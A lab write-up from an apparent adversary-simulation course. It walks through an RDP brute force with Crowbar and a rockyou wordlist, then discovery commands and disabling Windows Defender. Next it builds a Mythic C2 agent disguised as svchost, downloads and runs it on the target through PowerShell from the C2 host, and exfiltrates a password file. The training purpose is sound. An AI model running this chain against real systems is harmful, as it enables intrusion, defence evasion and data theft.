# Day 21: Performing a Brute Force Attack and Establishing a C2 Session

**Week:** 3 | **Phase:** Adversary Simulation
**← [Back to README](../../README.md) | [← Day 20](./day-20-mythic-c2-setup.md)**

> ⚠️ **Lab Context:** All activity performed within an isolated personal cloud lab environment for educational purposes. No real systems were targeted.

---

## 1. Introduction

**Goal:** Learn how to perform a Brute Force attack, generate a Mythic agent, and establish a successful C2 session from a Windows server.

---

## 2. Objective

- Use Kali Linux to perform a Brute Force attack on the lab Windows server.
- Perform discovery commands and defence evasion.
- Execute Mythic C2 to generate a payload with a C2 profile.
- Use PowerShell to download the Mythic agent from the Mythic C2 server.
- Establish a C2 connection and download a password file from the Windows server.

---

## 3. Preparing the Windows Server

1. Create a fake file named `passwords.txt` in the Documents folder.
2. Change the password to `Winter2024!`:
   - Go to Start Menu > Username > Change Account Settings > Sign-in Options > Password > Change.
   - Enter current password, then set new password to `Winter2024!`.
   - If password policy requirements are not met, adjust settings in Local Group Policy Editor:
     - Minimum password length: 5 characters.
     - Disable complexity requirements.

---

## 4. Performing RDP Brute Force Attack

**Log in to Kali Linux machine.**

**Prepare wordlist from Kali Linux:**

Navigate to `/usr/share/wordlists` and unzip `rockyou.txt`:

```bash
sudo gunzip rockyou.txt.gz
```

Extract first 50 entries and add `Winter2024!` to the list:

```bash
head -n50 rockyou.txt > /home/user/Desktop/Challenge-Wordlist.txt
```

**Install and use Crowbar for Brute Force attack:**

```bash
sudo apt-get update && sudo apt-get upgrade
sudo apt-get install crowbar
```

**Perform Brute Force Attack:**

```bash
crowbar -b rdp -u administrator -C Challenge-Wordlist.txt -s <Challenge-WIN-Haji-IP>/32
```

Successful RDP login with username `Administrator` and password `Winter2024!`.

**Connect via RDP:**

```bash
xfreerdp /u:Administrator /p:Winter2024! /v:<Challenge-WIN-Haji-IP>:3389
```

---

## 5. Discovery Commands

In the RDP session, open Command Prompt/PowerShell and run:

```cmd
whoami
ipconfig
net user
net group
net user Administrator
```

---

## 6. Defence Evasion

**Disable Windows Defender:**
- Open Windows Security settings.
- Disable Real-time protection and other security features.

---

## 7. Execution Phase

**Install Apollo agent on Mythic server:**

```bash
./mythic-cli install github https://github.com/MythicAgents/Apollo
```

**Install HTTP C2 profile:**

```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

**Create Payload:**
- Generate new payload in Mythic web GUI.
- Select target machine (Windows) and output format (Windows Executable).
- Include all available commands and set callback host: `http://<Challenge-Mythic-IP>`.
- Set port `80` and leave everything else as default.
- Name the payload `ChallengeMythicPayload`.

---

## 8. Downloading and Executing the Payload

**Download payload on Mythic server:**

```bash
wget --no-check-certificate <payload-download-link>
mv <downloaded-file> svchost-haji.exe
```

**Serve Payload via HTTP:**

```bash
mkdir /tmp/payload && mv svchost-haji.exe /tmp/payload/
ufw allow 9999
python3 -m http.server 9999
```

**Download Payload on Windows Server (PowerShell):**

```powershell
Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe
```

**Execute Payload:**

```powershell
.\servicehost-haji.exe
```

Allow port 80 on Mythic Server:

```bash
ufw allow 80
```

**Verify the connection:**

```cmd
netstat -anob
```

---

## 9. Establishing C2 Connection

**Interact with Active Callback:**
- Use Mythic web GUI to interact with the active callback.
- Run commands like `whoami` and `ifconfig` to verify the connection.

---

## 10. Exfiltration

**Download Fake Password File via C2:**

```
download C:\Users\Administrator\Documents\passwords.txt
```

**Verify Download** — Check the downloaded file in Mythic web GUI and confirm the contents.

---

*→ Next: [Day 22 — Mythic Alerts & Dashboards](./day-22-mythic-alerts-dashboards.md)*
